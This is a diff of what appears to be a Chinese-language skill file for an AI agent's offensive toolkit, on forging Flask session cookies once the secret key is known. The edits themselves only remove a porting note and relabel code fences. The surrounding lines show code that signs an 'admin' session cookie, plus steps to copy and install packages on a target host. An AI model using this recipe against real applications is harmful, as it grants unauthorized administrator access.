@@ -4,7 +4,7 @@ description: 'Flask session 伪造：已知 secret key 但目标无外网时，�
 disable-model-invocation: true
 metadata: { domain: web, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+
 
 # Flask Session 伪造实战
 
@@ -29,7 +29,7 @@ app.secret_key = "THE_SECRET_KEY"
 si = SecureCookieSessionInterface()
 s = si.get_signing_serializer(app)
 session_cookie = s.dumps({"user_id": 1, "username": "admin"})
-```
+```text
 
 ## 如果目标无外网（无法 pip install）
 
@@ -42,7 +42,7 @@ scp -i key /tmp/pkgs/*.whl user@target:/tmp/
 
 # 目标上安装
 pip3 install --break-system-packages /tmp/*.whl
-```
+```text
 
 **版本确认**：从目标 HTTP 响应头获取 `Server: Werkzeug/X.Y.Z Python/A.B.C`，据此选择匹配的 Flask/itsdangerous 版本。
 
